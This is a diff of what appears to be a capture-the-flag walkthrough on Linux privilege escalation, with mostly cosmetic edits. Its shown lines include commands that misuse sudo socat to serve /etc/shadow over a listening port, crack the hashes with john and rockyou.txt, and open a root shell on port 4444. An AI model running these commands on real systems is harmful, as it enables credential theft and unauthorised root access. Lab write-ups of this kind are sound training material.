@@ -258,7 +258,7 @@ a quick search on the web and i found this line of code: "socat TCP4-LISTEN:4444
 
 >[$file] =                the file we want to read
 
-our syntax will be as follow (dont forget 'sudo' to run this proccess as root)
+our syntax will be as follow (dont forget 'sudo' to run socat as root)
  
 ```bash
 sudo socat TCP4-LISTEN:4444,reuseaddr OPEN:/etc/shadow
@@ -358,7 +358,7 @@ unshadow passwd shaodw > hash
 john hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
-##### disclaimer
+##### Disclaimer
 this can take some time in the meantime lets explorer other methods of privilage escelation.
 get a root shell insted of getting files can be very simple with socat and would save us some time with john
 in the socat command we just need to replace OPEN with SYSTEM and /etc/passwd with /bin/bash or any shell you want
@@ -371,7 +371,8 @@ sudo socat TCP4-LISTEN:4444,reuseaddr  SYSTEM:/bin/bash
 ```
 
 >whoami
-root
+
+>root
  
 easely enoght we got our-self a root shell just like that
 ### now to get our flags!
